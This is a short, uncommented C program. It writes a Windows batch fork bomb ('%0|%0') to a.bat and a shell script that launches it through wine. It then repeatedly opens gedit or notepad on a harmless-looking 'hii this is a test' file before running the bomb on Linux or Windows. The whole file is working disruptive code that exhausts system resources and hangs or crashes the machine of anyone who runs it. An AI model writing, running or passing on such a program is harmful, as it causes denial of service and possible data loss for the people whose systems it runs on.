#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main()
{
    FILE *fp;
    fp = fopen("a.bat", "w");
    fprintf(fp, "%s", "%0|%0");
    fclose(fp);
    fp = fopen("a.sh", "w");
    fprintf(fp, "%s", "chmod 755 a.bat\nwine a.bat");
    fclose(fp);
#if __linux

    fp = fopen("helo.txt", "a");
    fprintf(fp, "%s", "hii this is a test\n");
    fclose(fp);
    int i = 10;
    while (i--)
        system("gedit helo.txt");
    system("./a.sh");
#endif
#if __WIN32
    FILE *fpw;
    fpw = fopen("helo.txt", "a");
    fprintf(fpw, "%s", "hii this is a test\n");
    fclose(fpw);
    int j = 5;
    while (j--)
        system("notepad helo.txt");
    system("a.bat");
#endif
}